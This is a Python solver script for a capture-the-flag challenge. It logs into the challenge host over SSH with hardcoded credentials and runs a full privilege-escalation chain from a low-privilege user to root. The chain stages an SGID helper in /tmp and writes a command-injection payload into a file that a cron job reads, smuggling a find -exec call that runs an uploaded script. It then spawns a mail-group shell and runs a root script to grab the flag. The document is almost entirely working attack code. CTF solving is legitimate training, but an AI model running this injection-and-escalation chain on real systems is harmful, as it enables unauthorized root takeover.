#!/usr/bin/env python3
"""Undercover one-session solver: worker -> backupuser -> mail group -> OTP -> root."""

from __future__ import annotations

import argparse
import base64
import os
import re
import shlex
import time
import uuid
from pathlib import Path

import paramiko

DEFAULT_HOST = "undercover-zhvo8wkj.avitoctf.ru"
DEFAULT_USER = "worker"
DEFAULT_PASSWORD = "ufqIDMVBm5MHPHg8dcVTcQ"
FLAG_RE = re.compile(r"avito\{[^}\r\n]+\}")
TASK_DIR = Path(__file__).resolve().parent


class PersistentShell:
    """A single Paramiko PTY channel, required because each login gets a fresh container."""

    def __init__(self, host: str, port: int, user: str, password: str) -> None:
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(
            host,
            port=port,
            username=user,
            password=password,
            look_for_keys=False,
            allow_agent=False,
            timeout=30,
        )
        self.channel = self.client.invoke_shell(term="dumb", width=250, height=100)
        self.channel.settimeout(0.25)
        time.sleep(1)
        self.drain()
        self.channel.send("stty -echo 2>/dev/null; PS1=''; PS2=''; set +m\n")
        time.sleep(0.3)
        self.drain()

    def drain(self) -> bytes:
        """Read every byte currently available from the PTY."""
        output = bytearray()
        while self.channel.recv_ready():
            output.extend(self.channel.recv(65536))
        return bytes(output)

    def run(self, command: str, timeout: float = 30) -> tuple[int, str]:
        """Run a command in the same shell and delimit its output with a random marker."""
        marker = "__CTF_END_" + uuid.uuid4().hex + "__"
        self.drain()
        self.channel.send(
            f"( {command}\n); __ctf_rc=$?; printf '\\n{marker}:%s\\n' \"$__ctf_rc\"\n"
        )
        raw = bytearray()
        deadline = time.monotonic() + timeout
        marker_bytes = marker.encode()
        while time.monotonic() < deadline:
            if self.channel.recv_ready():
                raw.extend(self.channel.recv(65536))
                if marker_bytes in raw:
                    time.sleep(0.1)
                    raw.extend(self.drain())
                    break
            else:
                time.sleep(0.05)
        else:
            raise TimeoutError(f"remote command timed out after {timeout}s: {command[:120]}")
        text = raw.decode("utf-8", "replace")
        match = re.search(re.escape(marker) + r":(\d+)", text)
        if not match:
            raise RuntimeError(f"remote marker was truncated: {text[-500:]}")
        output = text[: match.start()].rstrip()
        return int(match.group(1)), output

    def upload_text(self, local: Path, remote: str, mode: str = "700") -> None:
        """Upload a small text file through base64 over the existing channel."""
        encoded = base64.b64encode(local.read_bytes()).decode()
        command = (
            f"printf %s {shlex.quote(encoded)} | base64 -d > {shlex.quote(remote)}"
            f" && chmod {shlex.quote(mode)} {shlex.quote(remote)}"
        )
        code, output = self.run(command)
        if code:
            raise RuntimeError(f"upload {local.name} failed ({code}): {output}")

    def close(self) -> None:
        """Close the one persistent target container/session."""
        self.channel.close()
        self.client.close()


def main() -> None:
    """Execute all three privilege-escalation links in one SSH container."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=os.environ.get("UNDERCOVER_HOST", DEFAULT_HOST))
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--user", default=os.environ.get("UNDERCOVER_USER", DEFAULT_USER))
    parser.add_argument(
        "--password", default=os.environ.get("UNDERCOVER_PASSWORD", DEFAULT_PASSWORD)
    )
    parser.add_argument("--cron-timeout", type=float, default=90)
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        assert FLAG_RE.search("FLAGSTART avito{fixture} FLAGEND")
        assert (TASK_DIR / "m.sh").is_file()
        assert (TASK_DIR / "orch.sh").is_file()
        print("self-test: OK")
        return

    shell = PersistentShell(args.host, args.port, args.user, args.password)
    try:
        code, output = shell.run(
            "mv /backup/deactivated/utils/delete_old_mail /tmp/.dom && ls -l /tmp/.dom"
        )
        print("[1] staged SGID helper:", output)
        if code:
            raise RuntimeError("could not stage /tmp/.dom")

        shell.upload_text(TASK_DIR / "m.sh", "/tmp/.m.sh")
        payload = ';/tmp/.dom "1 -o -type d -exec /tmp/.m.sh {} + -o -type f";#'
        code, output = shell.run(f"printf '%s\\n' {shlex.quote(payload)} > /backup/listing")
        if code:
            raise RuntimeError(f"could not arm /backup/listing: {output}")
        print("[2] cron payload armed; waiting for /tmp/.ready")

        deadline = time.monotonic() + args.cron_timeout
        while time.monotonic() < deadline:
            _code, output = shell.run(
                "if test -f /tmp/.ready; then echo READY; ls -l /tmp/.mbash; fi"
            )
            if "READY" in output:
                print("[2] backupuser -> egid=mail complete:", output)
                break
            time.sleep(2)
        else:
            raise TimeoutError("cron did not create /tmp/.mbash in time")

        shell.upload_text(TASK_DIR / "orch.sh", "/tmp/.orch.sh")
        _code, output = shell.run("/tmp/.mbash -p /tmp/.orch.sh", timeout=90)
        print("[3] OTP/root output:\n" + output)
        match = FLAG_RE.search(output)
        if not match:
            _code, retry = shell.run("cat /tmp/flag_out 2>/dev/null", timeout=10)
            print(retry)
            match = FLAG_RE.search(retry)
        if not match:
            raise RuntimeError("root chain finished without an avito{...} flag")
        print(f"FLAG: {match.group(0)}")
    finally:
        shell.close()


if __name__ == "__main__":
    main()
